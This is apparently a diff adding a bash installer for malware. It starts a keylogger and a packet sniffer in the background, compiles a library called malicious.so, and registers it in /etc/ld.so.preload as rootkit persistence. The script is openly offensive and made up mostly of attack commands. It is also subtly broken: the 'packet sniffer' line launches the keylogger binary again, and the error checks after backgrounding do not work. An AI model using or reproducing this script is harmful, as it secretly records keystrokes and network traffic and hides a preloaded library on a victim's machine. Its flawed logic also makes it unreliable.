@@ -1,0 +1,50 @@
+#!/usr/bin/env bash
+
+if [ $# -lt 2 ]; then
+    echo usage: $0 <keylog log> <packet sniffer log>
+fi
+
+echo starting keylogger
+./keylog "$1" &
+
+if [ $? -ne 0 ]; then
+    case $? in
+        1)
+            echo unable to create output file
+            ;;
+        2)
+            echo unable to open keyboard device \(maybe requires su\?\)
+            ;;
+        *)
+            echo unknown error
+            ;;
+    esac
+fi
+
+echo starting packet sniffer
+./keylog "$2" &
+
+if [ $? -ne 0 ]; then
+    case $? in
+        1)
+            echo unable to open socket
+            exit 1
+            ;;
+        2)
+            echo unable to open file
+            exit 1
+            ;;
+        *)
+            echo unknown error
+            exit 1
+            ;;
+    esac
+fi
+
+echo compiling rootkit
+gcc -fpic -shared -o malicious.so malicious.c -nostartfiles -ldl
+
+mv malicious.so /lib/x86_64-linux-gnu/malicious.so
+
+echo adding to ld_preload
+echo /lib/x86_64-linux-gnu/malicious.so >> /etc/ld.so.preload
